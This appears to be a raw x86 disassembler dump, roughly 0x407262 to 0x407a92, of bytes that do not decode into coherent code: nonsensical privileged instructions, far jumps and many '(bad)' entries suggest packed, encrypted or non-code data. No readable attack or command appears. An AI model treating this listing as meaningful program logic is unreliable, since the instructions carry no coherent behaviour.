  407262:	test   al,0xf4
  407264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407265:	jbe    0x40728c
  407267:	push   ecx
  407268:	pop    edi
  407269:	ss call 0xff3c3971
  40726f:	inc    ebx
  407270:	sub    WORD PTR [eax],sp
  407273:	sbb    ecx,0x6eba6f53
  407279:	aad    0xb0
  40727b:	fist   WORD PTR [edi-0x710f3e65]
  407281:	xchg   ebx,eax
  407282:	pop    ds
  407283:	pusha  
  407284:	inc    ebp
  407285:	in     al,0x71
  407287:	test   BYTE PTR [ebx+eax*1-0x35f286f],bh
  40728e:	je     0x407242
  407290:	sbb    ah,0x67
  407293:	push   esi
  407294:	inc    esp
  407295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407296:	imul   DWORD PTR [ebp-0x48]
  407299:	mov    ch,0x6a
  40729b:	pushf  
  40729c:	cmp    ch,al
  40729e:	aad    0xb5
  4072a0:	adc    DWORD PTR ds:0x9a227c15,eax
  4072a6:	in     al,0xaa
  4072a8:	adc    BYTE PTR [edi-0xc1b0e8f],dl
  4072ae:	mov    cl,BYTE PTR [edi+0x16]
  4072b1:	push   eax
  4072b2:	lea    ecx,[eax+0x1e]
  4072b5:	fmulp  st(5),st
  4072b7:	push   ebx
  4072b8:	icebp  
  4072b9:	call   0xfbb0:0x9a2174a2
  4072c0:	xor    bh,BYTE PTR [ebp+0x72]
  4072c3:	push   ecx
  4072c4:	sbb    ebp,DWORD PTR [ebp-0x1ce56a7]
  4072ca:	test   eax,0xd990a4b6
  4072cf:	push   0x59
  4072d1:	sahf   
  4072d2:	pop    edx
  4072d3:	add    eax,0x5e58a1cd
  4072d8:	cmp    al,0x52
  4072da:	inc    ebx
  4072db:	imul   ebp,DWORD PTR [edx-0x7bae5778],0x91f9d4f2
  4072e5:	fstp   QWORD PTR [edx+0x11c37e92]
  4072eb:	xor    DWORD PTR [ecx],edx
  4072ed:	pop    ebx
  4072ee:	xchg   DWORD PTR [eax],eax
  4072f0:	sub    al,0x48
  4072f2:	pop    edi
  4072f3:	in     al,0xbb
  4072f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072f6:	and    DWORD PTR [ebp+0xf18a688],ebp
  4072fc:	pushf  
  4072fd:	iret   
  4072fe:	cmp    al,ah
  407300:	mov    esp,0x48687cb9
  407305:	cmovle eax,DWORD PTR [esi+0x52]
  407309:	hlt    
  40730a:	inc    edx
  40730b:	ret    0xb094
  40730e:	dec    esi
  40730f:	mov    al,ds:0xf9e988fb
  407314:	sub    eax,DWORD PTR [ecx-0x3c]
  407317:	push   cs
  407318:	add    al,0x98
  40731a:	pop    eax
  40731b:	lea    ebp,[eax-0x6f]
  40731e:	imul   al
  407320:	push   ds
  407321:	mov    esp,0xd801f74
  407326:	cli    
  407327:	aad    0x41
  407329:	push   ecx
  40732a:	adc    DWORD PTR ds:0xf9c810a4,esi
  407330:	lods   al,BYTE PTR ds:[esi]
  407331:	shr    DWORD PTR [edi-0x55342e70],1
  407337:	mov    ecx,0x14a8854c
  40733c:	idiv   BYTE PTR [edi+0x29d7bc0a]
  407342:	aam    0xaa
  407344:	loop   0x407385
  407346:	dec    esp
  407347:	cmp    esp,DWORD PTR [edx-0x64f9ca06]
  40734d:	test   al,0xff
  40734f:	rcr    DWORD PTR [edx],cl
  407351:	clc    
  407352:	adc    cl,al
  407354:	mov    ch,0x60
  407356:	and    DWORD PTR [eax+0x31019956],esp
  40735c:	pop    eax
  40735d:	push   edi
  40735e:	mov    esi,0xfeed43a1
  407363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407364:	icebp  
  407365:	or     BYTE PTR [edi+eax*8+0x7a664156],cl
  40736c:	xor    DWORD PTR [ecx+0x295ff7fe],0xe145a664
  407376:	mov    eax,0xc3bbebeb
  40737b:	retf   
  40737c:	push   es
  40737d:	sar    ebp,1
  40737f:	pop    edi
  407380:	push   esp
  407381:	dec    DWORD PTR [ebp+0x71]
  407384:	push   esi
  407385:	ins    DWORD PTR es:[edi],dx
  407386:	sbb    edx,ebx
  407388:	inc    ecx
  407389:	lods   al,BYTE PTR ds:[esi]
  40738a:	sahf   
  40738b:	shl    DWORD PTR [esi-0x1c],cl
  40738e:	mov    esp,0x691cf43c
  407393:	sub    BYTE PTR [ecx-0x45737ac2],0xe4
  40739a:	ja     0x4073e7
  40739c:	shl    DWORD PTR [edi+0x46],cl
  40739f:	adc    al,0x28
  4073a1:	push   ecx
  4073a2:	fxch   st(4)
  4073a4:	xchg   ecx,eax
  4073a5:	jns    0x40737f
  4073a7:	jg     0x4073d9
  4073a9:	dec    ebp
  4073aa:	cmp    eax,0xa0253844
  4073af:	out    dx,al
  4073b0:	pop    ds
  4073b1:	xchg   DWORD PTR [ebx+esi*2+0x41630857],ebx
  4073b8:	je     0x4073ed
  4073ba:	sub    DWORD PTR [esi],0xffffff8a
  4073bd:	push   ebp
  4073be:	pop    ds
  4073bf:	ss stos DWORD PTR es:[edi],eax
  4073c1:	sbb    al,0x95
  4073c3:	pusha  
  4073c4:	push   ebx
  4073c5:	enter  0xc1eb,0xb7
  4073c9:	in     al,0x2e
  4073cb:	push   ds
  4073cc:	dec    edi
  4073cd:	push   ebx
  4073ce:	and    eax,0xc452557a
  4073d3:	(bad)  
  4073d4:	inc    ebp
  4073d5:	pop    ss
  4073d6:	sbb    BYTE PTR [ecx+0x39703cd8],al
  4073dc:	mov    ecx,0xfec14281
  4073e1:	mov    esi,0x52b188bc
  4073e6:	xchg   edx,eax
  4073e7:	adc    DWORD PTR [esi],ebx
  4073e9:	fiadd  DWORD PTR [edi+0x70f3cf52]
  4073ef:	jns    0x4073b9
  4073f1:	mov    esi,0x29c141c0
  4073f6:	out    dx,al
  4073f7:	xor    al,0xef
  4073f9:	into   
  4073fa:	and    DWORD PTR [ecx+ebx*8+0x27b7db3e],0xffffffb9
  407402:	push   cs
  407403:	and    eax,0xfba8ffdd
  407408:	dec    eax
  407409:	cwde   
  40740a:	jmp    0xb55d:0xcdfb0a30
  407411:	(bad)  
  407412:	jg     0x4073fa
  407414:	inc    ebx
  407415:	pop    di
  407417:	xchg   edi,eax
  407418:	stc    
  407419:	stc    
  40741a:	or     bl,ch
  40741c:	add    eax,0x4e498167
  407421:	xor    ebx,DWORD PTR [esi+0x20]
  407424:	test   BYTE PTR [ecx-0x168eea7d],0x1c
  40742b:	xchg   esi,eax
  40742c:	fsubr  st,st(7)
  40742e:	stos   BYTE PTR es:[edi],al
  40742f:	mov    bh,dl
  407431:	int    0xc
  407433:	lock test al,0x9
  407436:	dec    ebx
  407437:	mov    bl,BYTE PTR [ebx+eax*8+0x20]
  40743b:	dec    esp
  40743c:	mov    bl,cl
  40743e:	push   ebp
  40743f:	adc    al,0xc4
  407441:	pusha  
  407442:	call   0x7236:0xd448d6ce
  407449:	and    BYTE PTR [eax],bh
  40744b:	sub    al,BYTE PTR [ecx-0x37ba86cf]
  407451:	pop    ebp
  407452:	jnp    0x40740e
  407454:	pop    eax
  407455:	push   0xe47d9bc0
  40745a:	stc    
  40745b:	mov    bh,0x2a
  40745d:	ret    
  40745e:	jp     0x40743d
  407460:	jo     0x4073f0
  407462:	test   BYTE PTR [eax-0x55],0xb3
  407466:	loopne 0x407406
  407468:	and    eax,0xe89bb64b
  40746d:	or     eax,ecx
  40746f:	(bad)  
  407470:	retf   0x54f3
  407473:	push   0xec8fa92d
  407478:	(bad)  
  407479:	(bad)  
  40747a:	push   0xe4a9c784
  40747f:	add    eax,0xfbaab4f1
  407484:	mov    ebp,DWORD PTR [ebx-0x5e]
  407487:	or     al,0x60
  407489:	nop
  40748a:	ror    BYTE PTR [edx+0x79],cl
  40748d:	mov    eax,ds:0xf73be308
  407492:	push   edx
  407493:	inc    edi
  407494:	push   es
  407495:	sub    eax,0x4a090f58
  40749a:	pop    ebp
  40749b:	pop    eax
  40749c:	adc    BYTE PTR [ebp-0x1a],dl
  40749f:	push   0xfffffff0
  4074a1:	mov    esp,ecx
  4074a3:	ror    BYTE PTR [eax-0x5376ed53],1
  4074a9:	adc    BYTE PTR [ecx],dh
  4074ab:	jb     0x40748a
  4074ad:	mov    dl,0x3c
  4074af:	pop    ebx
  4074b0:	(bad)  
  4074b1:	leave  
  4074b2:	js     0x40747a
  4074b4:	mov    edx,0xf8f85a05
  4074b9:	mov    edi,cs
  4074bb:	fisubr WORD PTR [eax+0xcace320]
  4074c1:	mov    esp,0xe2c921f9
  4074c6:	mov    bl,0x95
  4074c8:	sub    esi,eax
  4074ca:	dec    eax
  4074cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074cc:	je     0x4074dc
  4074ce:	push   esi
  4074cf:	je     0x407548
  4074d1:	sbb    ebp,DWORD PTR [ebp-0x18bba097]
  4074d7:	fbstp  TBYTE PTR [ebx+0x794f7d15]
  4074dd:	imul   esp,DWORD PTR [eax-0x8f19b2a],0x77
  4074e4:	adc    BYTE PTR ds:0xb2a2b73a,ch
  4074ea:	sub    al,0xa1
  4074ec:	(bad)  
  4074ed:	mov    ah,0x4e
  4074ef:	xor    eax,0xfa0f35cf
  4074f4:	jmp    0x4074cd
  4074f6:	and    al,0xd7
  4074f8:	mov    bh,0x42
  4074fa:	and    dl,BYTE PTR [ecx+edx*2+0x31]
  4074fe:	add    esp,DWORD PTR [edi]
  407500:	mov    DWORD PTR [esi-0x854e39],ecx
  407506:	sub    al,0xc5
  407508:	inc    esp
  407509:	adc    eax,esi
  40750b:	lea    edx,[esp+ebp*4]
  40750e:	cmp    bl,BYTE PTR [edx]
  407510:	xchg   edi,eax
  407511:	push   ecx
  407512:	mov    bh,ah
  407514:	pop    edx
  407515:	loopne 0x4074c6
  407517:	push   ecx
  407518:	inc    edx
  407519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40751a:	pushf  
  40751b:	dec    DWORD PTR [ecx+0x62a82738]
  407521:	jle    0x4074c6
  407523:	cli    
  407524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407525:	push   ebx
  407526:	mov    ds:0x24a5fe50,eax
  40752b:	adc    eax,0x5246d948
  407530:	jae    0x40753c
  407532:	jne    0x407509
  407534:	in     eax,0x2
  407536:	outs   dx,BYTE PTR ds:[esi]
  407537:	add    al,BYTE PTR [edi+0x701442b4]
  40753d:	cmp    eax,0xc9b8c2ae
  407542:	jl     0x407584
  407544:	adc    DWORD PTR [eax+0x43475327],eax
  40754a:	jae    0x407570
  40754c:	pop    esp
  40754d:	push   eax
  40754e:	fistp  DWORD PTR [edx]
  407550:	sbb    ecx,ebp
  407552:	fstp   DWORD PTR [edx-0x56]
  407555:	dec    esi
  407556:	pop    ds
  407557:	inc    eax
  407558:	lods   al,BYTE PTR ds:[esi]
  407559:	fild   WORD PTR [ebp-0x20]
  40755c:	jb     0x407569
  40755e:	and    ebp,edx
  407560:	jge    0x407538
  407562:	ret    0x9859
  407565:	mov    ds:0xfa12c00e,al
  40756a:	cmp    edi,DWORD PTR [edi+0x1d]
  40756d:	mov    WORD PTR [edx-0x1e],ss
  407570:	and    dl,0x3f
  407573:	xchg   esi,eax
  407574:	in     eax,0x38
  407576:	push   es
  407577:	xor    ch,ah
  407579:	cmp    dh,al
  40757b:	sub    esi,DWORD PTR [ecx+0x273210d8]
  407581:	lea    edx,[ecx-0x148674d5]
  407587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407588:	mov    bh,0x30
  40758a:	imul   ebx,edi,0x7e
  40758d:	sbb    eax,0xa2286ee4
  407592:	mov    eax,ds:0xd9612f73
  407597:	imul   ebp,DWORD PTR [edx]
  40759a:	mov    WORD PTR [edx-0x2630ac55],es
  4075a0:	std    
  4075a1:	push   ds
  4075a2:	mov    esp,0x7db4e23b
  4075a7:	pop    ss
  4075a8:	jmp    0x3445:0x9428b24a
  4075af:	jle    0x407622
  4075b1:	sub    ah,bh
  4075b3:	mov    ch,0x91
  4075b5:	nop
  4075b6:	aam    0x42
  4075b8:	clc    
  4075b9:	jmp    0x4075d8
  4075bb:	mov    cl,0x47
  4075bd:	dec    esp
  4075be:	push   esi
  4075bf:	and    DWORD PTR [edx-0x16],ebp
  4075c2:	in     eax,dx
  4075c3:	xlat   BYTE PTR ds:[ebx]
  4075c4:	xor    bh,0xbf
  4075c7:	cmp    eax,0x11d9ca2b
  4075cc:	call   0x3698:0xa1f3624b
  4075d3:	xchg   edi,eax
  4075d4:	js     0x4075ae
  4075d6:	jnp    0x407603
  4075d8:	enter  0x27e6,0x30
  4075dc:	dec    esp
  4075dd:	std    
  4075de:	push   esi
  4075df:	push   esi
  4075e0:	aaa    
  4075e1:	stc    
  4075e2:	sub    BYTE PTR [ecx],bh
  4075e4:	scas   eax,DWORD PTR es:[edi]
  4075e5:	jp     0x4075dc
  4075e7:	pusha  
  4075e8:	push   es
  4075e9:	addr16 pop esp
  4075eb:	inc    esp
  4075ec:	shr    BYTE PTR [eax+0x35e8abe8],cl
  4075f2:	sbb    edi,esp
  4075f4:	inc    ebp
  4075f5:	cmp    BYTE PTR [ebp-0x7],cl
  4075f8:	sbb    eax,0xd25198a3
  4075fd:	lea    ecx,[ecx]
  4075ff:	mov    gs:0x3251a99f,eax
  407605:	aaa    
  407606:	in     al,0x13
  407608:	jge    0x40766d
  40760a:	loope  0x4075d2
  40760c:	push   ss
  40760d:	or     BYTE PTR [esi],al
  40760f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407610:	inc    ebp
  407611:	mov    ch,0x1f
  407613:	jo     0x4075aa
  407615:	pop    esi
  407616:	movups xmm3,XMMWORD PTR [esi]
  407619:	jecxz  0x4075aa
  40761b:	pop    ebp
  40761c:	dec    edx
  40761d:	sub    BYTE PTR [edx+eiz*4-0x401d9ce7],bh
  407624:	mov    ecx,0x4ec08e9
  407629:	hlt    
  40762a:	xchg   edx,esp
  40762c:	and    eax,0xebeacc5e
  407631:	mov    bl,BYTE PTR [eax-0x14]
  407634:	aas    
  407635:	out    0x2,eax
  407637:	sti    
  407638:	(bad)
  40763c:	lods   al,BYTE PTR ds:[esi]
  40763d:	sti    
  40763e:	fmul   st,st(3)
  407640:	pop    esi
  407641:	cmc    
  407642:	mov    eax,ds:0x7373d72
  407647:	inc    eax
  407648:	clc    
  407649:	rol    DWORD PTR [ecx+ebx*8-0x1f],cl
  40764d:	outs   dx,BYTE PTR ds:[esi]
  40764e:	dec    bl
  407650:	fild   WORD PTR [edi+0x2d09aba]
  407656:	(bad)  
  407657:	xlat   BYTE PTR ds:[ebx]
  407658:	repnz push es
  40765a:	outs   dx,BYTE PTR ds:[esi]
  40765b:	test   DWORD PTR [edi+0x64],esp
  40765e:	pop    es
  40765f:	pusha  
  407660:	fdiv   QWORD PTR [eax+0x4251c8c6]
  407666:	sbb    eax,0xcf5083d5
  40766b:	sub    DWORD PTR [esi-0x4],ebp
  40766e:	xor    eax,0x63afa9bf
  407673:	push   esp
  407674:	dec    eax
  407675:	das    
  407676:	mov    al,0xe
  407678:	dec    edi
  407679:	mov    dh,0x3f
  40767b:	imul   eax,DWORD PTR [edx+ecx*4-0x5b48da6f],0x751c5c65
  407686:	sahf   
  407687:	cli    
  407688:	mov    ebx,0xcf17cb74
  40768d:	mov    bl,0xad
  40768f:	call   0x26aa21c
  407694:	mov    esp,0x4c238aee
  407699:	repz cmp al,0x65
  40769c:	repnz es cld 
  40769f:	popa   
  4076a0:	jp     0x4076dc
  4076a2:	cs dec edi
  4076a4:	inc    ebp
  4076a5:	test   BYTE PTR [ecx-0x79],bl
  4076a8:	mov    eax,0xdecceb5a
  4076ad:	outs   dx,BYTE PTR ds:[esi]
  4076ae:	mov    eax,0x14f02f7
  4076b3:	or     eax,0x24
  4076b6:	int3   
  4076b7:	xor    dl,BYTE PTR [edx-0x17]
  4076ba:	lock sbb al,BYTE PTR [edi-0x2f]
  4076be:	in     eax,dx
  4076bf:	xchg   DWORD PTR [ecx+0x547bdda0],ebp
  4076c5:	cmp    esi,DWORD PTR [eax]
  4076c7:	xor    BYTE PTR [ebx-0x58],dl
  4076ca:	and    eax,0xea8293de
  4076cf:	mov    ?,WORD PTR [ebx]
  4076d1:	and    eax,edx
  4076d3:	into   
  4076d4:	push   cs
  4076d5:	es xor cl,cl
  4076d8:	data16 add dl,al
  4076db:	loop   0x4076a6
  4076dd:	inc    edx
  4076de:	add    esi,esp
  4076e0:	push   0x615c138c
  4076e5:	retf   0x8d8c
  4076e8:	dec    edi
  4076e9:	popa   
  4076ea:	add    ecx,DWORD PTR [eax+0x46da3f49]
  4076f0:	cmc    
  4076f1:	stos   BYTE PTR es:[di],al
  4076f3:	jmp    0x7f60:0x29b8a837
  4076fa:	add    al,0xaa
  4076fc:	xor    BYTE PTR [edx-0x2c42f889],dl
  407702:	push   ebp
  407703:	into   
  407704:	push   ss
  407705:	cli    
  407706:	je     0x40777f
  407708:	xor    eax,0x60e8e419
  40770d:	lods   eax,DWORD PTR ds:[esi]
  40770e:	stos   DWORD PTR es:[edi],eax
  40770f:	popf   
  407710:	jae    0x40774b
  407712:	out    0x94,eax
  407714:	sub    DWORD PTR [eax+0x697357d4],ebx
  40771a:	cmp    BYTE PTR [edi+0x3e7936f7],0x9f
  407721:	fnclex 
  407723:	xchg   ecx,eax
  407724:	or     esp,DWORD PTR [edi+0x5d]
  407727:	hlt    
  407728:	sbb    esp,DWORD PTR [eax]
  40772a:	mov    ds:0xbf043584,al
  40772f:	xor    ch,cl
  407731:	inc    ebx
  407732:	adc    DWORD PTR [ebp+ecx*8+0x12],ebx
  407736:	jb     0x407711
  407738:	sub    BYTE PTR [edi+edi*8+0x582ef9ad],ah
  40773f:	popa   
  407740:	jp     0x4077b4
  407742:	mov    al,ds:0xbb1e51a2
  407747:	xchg   ebp,eax
  407748:	push   edi
  407749:	dec    edi
  40774a:	in     eax,0x67
  40774c:	mov    ecx,0x463fa8f6
  407751:	lock out 0x41,eax
  407754:	adc    BYTE PTR [ebx+0x40a388a8],0xf3
  40775b:	in     eax,0x95
  40775d:	(bad)  
  40775e:	sbb    cl,BYTE PTR [edi+0x3c7db625]
  407764:	test   DWORD PTR [edi-0x21],0x78ca1da8
  40776b:	pop    edx
  40776c:	mov    ds:0xca93572f,al
  407771:	mov    dh,0xb9
  407773:	ret    
  407774:	mov    edi,0x1f2c352d
  407779:	cmp    esp,DWORD PTR [edx+edx*4+0xe]
  40777d:	inc    ebp
  40777e:	mov    BYTE PTR ds:0x26d15d7a,bh
  407784:	mov    dl,0x18
  407786:	outs   dx,DWORD PTR ds:[esi]
  407787:	add    eax,0xa2c3950
  40778c:	ret    
  40778d:	or     BYTE PTR [eax+0x3b506c28],bh
  407793:	jge    0x4077b7
  407795:	xor    al,0x77
  407797:	aaa    
  407798:	mov    ecx,0xa6fe3f97
  40779d:	and    esp,esi
  40779f:	cmp    BYTE PTR [ebp-0x207a7adb],cl
  4077a5:	shr    DWORD PTR [ebp+0x74],0x61
  4077a9:	popf   
  4077aa:	enter  0x7758,0xc5
  4077ae:	push   edi
  4077af:	sbb    DWORD PTR [esi-0x8332bfe],ebx
  4077b5:	out    0xb2,eax
  4077b7:	aad    0x10
  4077b9:	popf   
  4077ba:	or     esi,DWORD PTR [esi]
  4077bc:	int3   
  4077bd:	jl     0x40783a
  4077bf:	fidiv  DWORD PTR [edi-0xe]
  4077c2:	imul   esi,DWORD PTR [edx+0x5],0x57fc0107
  4077c9:	jmp    0xf740:0x4297a160
  4077d0:	aam    0xed
  4077d2:	push   cs
  4077d3:	mov    BYTE PTR [eax],al
  4077d5:	ja     0x4077c8
  4077d7:	xor    eax,0x3efc401a
  4077dc:	xor    DWORD PTR [esi-0x16],edx
  4077df:	adc    ecx,esp
  4077e1:	rcl    BYTE PTR [eax+ebx*1],cl
  4077e4:	push   0x2c1b52da
  4077e9:	push   ss
  4077ea:	push   es
  4077eb:	aam    0x9f
  4077ed:	jno    0x4077c0
  4077ef:	popf   
  4077f0:	xlat   BYTE PTR ds:[ebx]
  4077f1:	dec    eax
  4077f2:	pop    esp
  4077f3:	xchg   BYTE PTR [eax+0x2d00d800],cl
  4077f9:	shl    DWORD PTR ds:0x5845a93,0x5f
  407800:	jge    0x40781c
  407802:	mov    cl,0x41
  407804:	xor    eax,0xd9c30f3b
  407809:	xor    cl,BYTE PTR [ecx-0x2a]
  40780c:	js     0x40786d
  40780e:	stos   BYTE PTR es:[edi],al
  40780f:	pop    edx
  407810:	adc    BYTE PTR [ebx],dh
  407812:	add    bl,ah
  407814:	retf   
  407815:	(bad)  
  407816:	popf   
  407817:	aad    0xd9
  407819:	in     eax,dx
  40781a:	das    
  40781b:	cli    
  40781c:	adc    al,0xdb
  40781e:	test   eax,0xf8dc11c2
  407823:	sahf   
  407824:	sbb    cl,bl
  407826:	(bad)  
  407827:	loope  0x4077aa
  407829:	xchg   esp,eax
  40782a:	addr16 cmp eax,0xd91a7260
  407830:	fwait
  407831:	mov    esi,0x948bfee0
  407836:	aam    0x64
  407838:	xor    eax,0xacd3f724
  40783d:	cwde   
  40783e:	(bad)  
  40783f:	sbb    ch,dh
  407841:	jne    0x4077d8
  407843:	push   ebp
  407844:	adc    ah,BYTE PTR [eax-0x4b]
  407847:	inc    ebx
  407848:	push   ss
  407849:	ficomp WORD PTR [eax]
  40784b:	loop   0x407889
  40784d:	fild   DWORD PTR [edx-0x3c060d5f]
  407853:	cmp    ah,BYTE PTR [ebx+0x7500d813]
  407859:	cwde   
  40785a:	mov    edx,0xbf4afb0b
  40785f:	std    
  407860:	mov    ebp,0x3207e6ad
  407865:	cmp    eax,0x4b8bed99
  40786a:	push   ds
  40786b:	mov    ebp,0xf3599ea
  407870:	mov    ch,ah
  407872:	and    eax,DWORD PTR [esi+0x30]
  407875:	and    cl,BYTE PTR [ebx-0x50bdffa7]
  40787b:	xor    BYTE PTR ds:0x7071122d,bh
  407881:	sub    dl,BYTE PTR [edi-0x74]
  407884:	sahf   
  407885:	lods   al,BYTE PTR ds:[esi]
  407886:	aad    0x6a
  407888:	ins    DWORD PTR es:[edi],dx
  407889:	cli    
  40788a:	xchg   edx,eax
  40788b:	iret   
  40788c:	cmc    
  40788d:	or     DWORD PTR [ebx+0x49],0x6720f63b
  407894:	mov    bl,ah
  407896:	out    dx,eax
  407897:	idiv   BYTE PTR [esi]
  407899:	sar    BYTE PTR [edx-0x54],cl
  40789c:	jg     0x4078c0
  40789e:	sbb    al,BYTE PTR [ecx+0x74]
  4078a1:	stos   DWORD PTR es:[edi],eax
  4078a2:	js     0x40787c
  4078a4:	adc    eax,0x7664baba
  4078a9:	pop    ebp
  4078aa:	imul   esp,DWORD PTR es:[edi+esi*2+0x5e],0x3e
  4078b0:	fs mov esi,0x64842914
  4078b6:	imul   ebp,DWORD PTR ss:0x2f894f9,0x40
  4078be:	aas    
  4078bf:	xor    bh,al
  4078c1:	sti    
  4078c2:	sub    BYTE PTR [ebx],dh
  4078c4:	xlat   BYTE PTR ds:[ebx]
  4078c5:	cmp    DWORD PTR [ecx-0x93cfcfe],0xdadc9063
  4078cf:	imul   esi,DWORD PTR [eax+0x5992a11f],0xffffffd1
  4078d6:	loopne 0x407957
  4078d8:	sbb    ch,ah
  4078da:	in     al,dx
  4078db:	pop    eax
  4078dc:	pusha  
  4078dd:	inc    edx
  4078de:	xchg   esi,eax
  4078df:	(bad)  
  4078e0:	push   edx
  4078e1:	push   0xffffffa5
  4078e3:	mov    esi,0x2801a716
  4078e8:	jge    0x4078b9
  4078ea:	fldcw  WORD PTR [esi+0x3e]
  4078ed:	sub    DWORD PTR [ebp-0x7374c65e],ecx
  4078f3:	mov    ch,0xe9
  4078f5:	cmc    
  4078f6:	(bad)  
  4078f7:	inc    ebx
  4078f8:	jns    0x4078d4
  4078fa:	adc    dh,dh
  4078fc:	lea    ecx,[eax-0x2aa8e612]
  407902:	out    dx,eax
  407903:	data16 test al,0xa3
  407906:	cdq    
  407907:	gs mov ecx,0x1b553b2c
  40790d:	pop    es
  40790e:	(bad)  
  40790f:	enter  0x95ed,0x35
  407913:	mov    al,ds:0x8c3d99f6
  407918:	dec    esp
  407919:	ret    
  40791a:	and    eax,0x712b3527
  40791f:	inc    esp
  407920:	fnstcw WORD PTR [edi-0x57]
  407923:	xchg   ecx,eax
  407924:	daa    
  407925:	sub    eax,0x6ca59738
  40792a:	mov    bl,0x2e
  40792c:	ret    0xf6a9
  40792f:	and    al,0x28
  407931:	push   es
  407932:	cmc    
  407933:	sub    edi,ecx
  407935:	adc    BYTE PTR [ebp-0x3a6f4a43],ch
  40793b:	mov    ebp,0xb629863c
  407940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407941:	adc    DWORD PTR [edx],0xf
  407944:	jmp    0x8fb423b5
  407949:	adc    eax,0x81c41d6e
  40794e:	inc    edx
  40794f:	adc    BYTE PTR [ecx+0x7a9fbed6],ah
  407955:	cwde   
  407956:	mov    al,ds:0x983e696c
  40795b:	mov    ds:0x7c58912,al
  407960:	xchg   BYTE PTR [ebx],al
  407962:	jp     0x407910
  407964:	into   
  407965:	std    
  407966:	iret   
  407967:	push   ecx
  407968:	fdivr  DWORD PTR [ebx+eiz*4]
  40796b:	jno    0x4079e0
  40796d:	gs push edi
  40796f:	add    ah,dl
  407971:	pop    ss
  407972:	lock dec esp
  407974:	in     al,dx
  407975:	pusha  
  407976:	lods   al,BYTE PTR ds:[esi]
  407977:	test   edi,edx
  407979:	fld    QWORD PTR [esi]
  40797b:	add    eax,0xadf587b0
  407980:	inc    edx
  407981:	ds popf 
  407983:	sahf   
  407984:	mov    ebp,0x6bc0af02
  407989:	xchg   edx,eax
  40798a:	popa   
  40798b:	jg     0x4079b9
  40798d:	sahf   
  40798e:	cmp    DWORD PTR [eax+0x6b],edx
  407991:	inc    eax
  407992:	sti    
  407993:	mov    esp,0x874d5f24
  407998:	cmp    al,0xef
  40799a:	ja     0x4079bf
  40799c:	mov    esp,0x562c1030
  4079a1:	jno    0x407999
  4079a3:	jb     0x407931
  4079a5:	pop    ss
  4079a6:	mov    cl,0x97
  4079a8:	arpl   WORD PTR [esi-0x3d4c264d],ax
  4079ae:	mov    al,ds:0x1d6d8ab5
  4079b3:	mov    ds:0x68a6d1f2,eax
  4079b8:	fsubr  st(3),st
  4079ba:	and    BYTE PTR [edi+0x737458d5],cl
  4079c0:	add    DWORD PTR [esi-0x64],esp
  4079c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079c4:	mov    ecx,eax
  4079c6:	push   es
  4079c7:	or     BYTE PTR [eax+ecx*2-0x4577a9ec],al
  4079ce:	add    eax,0xbe9b8525
  4079d3:	xchg   ebp,eax
  4079d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079d5:	mov    WORD PTR [esi+0x44],cs
  4079d8:	push   ecx
  4079d9:	and    ecx,0xa07bb26
  4079df:	push   edx
  4079e0:	xor    BYTE PTR [ebx-0x6d6f9560],bh
  4079e6:	mov    eax,0xb903758b
  4079eb:	jae    0x4079d3
  4079ed:	jp     0x40798a
  4079ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f0:	mov    edx,?
  4079f2:	sbb    dl,BYTE PTR [eax]
  4079f4:	mov    bh,0x76
  4079f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f7:	inc    ebp
  4079f8:	jle    0x407a25
  4079fa:	xchg   edi,eax
  4079fb:	push   cs
  4079fc:	repz adc BYTE PTR [edx-0x38ad8774],al
  407a03:	inc    ebp
  407a04:	adc    BYTE PTR [ebx+0x4d1701ac],0x73
  407a0b:	push   ebp
  407a0c:	idiv   ah
  407a0e:	cmp    al,0x21
  407a10:	sbb    esp,ebx
  407a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a13:	or     eax,edx
  407a15:	and    esi,ebx
  407a17:	cmc    
  407a18:	dec    esp
  407a19:	xor    esi,DWORD PTR [edx-0x19903e06]
  407a1f:	in     al,0x84
  407a21:	pop    ecx
  407a22:	in     al,0x52
  407a24:	and    ecx,DWORD PTR [edi+0x76]
  407a27:	jns    0x4079b0
  407a29:	cdq    
  407a2a:	imul   edi,DWORD PTR [esp+ecx*4+0x1a05cca0],0x77
  407a32:	cld    
  407a33:	aam    0x9b
  407a35:	sbb    al,0x11
  407a37:	xchg   esi,eax
  407a38:	mov    edi,0x31188ab
  407a3d:	inc    ebp
  407a3e:	push   edi
  407a3f:	pop    ebx
  407a40:	imul   esp,DWORD PTR [eax-0x5],0xc5cfbf8a
  407a47:	retf   0x2b59
  407a4a:	cwde   
  407a4b:	sbb    edi,DWORD PTR [ebx]
  407a4d:	inc    edx
  407a4e:	cli    
  407a4f:	mov    esi,0x40c7746b
  407a54:	mov    DWORD PTR [esi+ebx*8-0x5],esi
  407a58:	add    al,BYTE PTR [ebx]
  407a5a:	mov    edx,DWORD PTR [esi+0x14015fdb]
  407a60:	and    al,0xab
  407a62:	pop    es
  407a63:	adc    DWORD PTR [ebp+edx*4-0x5d4976c7],ecx
  407a6a:	mov    bl,0xab
  407a6c:	arpl   WORD PTR [ebx],ax
  407a6e:	and    al,0x8d
  407a70:	or     al,0xca
  407a72:	push   0x6f
  407a74:	jecxz  0x407a50
  407a76:	mov    WORD PTR [edx-0x362e1ba7],fs
  407a7c:	sub    esi,DWORD PTR [edx-0x5295d1d3]
  407a82:	xor    DWORD PTR [ebx],ebx
  407a84:	outs   dx,BYTE PTR ds:[esi]
  407a85:	jns    0x407ab8
  407a87:	into   
  407a88:	es mov edi,0xc947f6ac
  407a8e:	imul   esp,esp,0xfffffff3
  407a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a92:	pop    ss
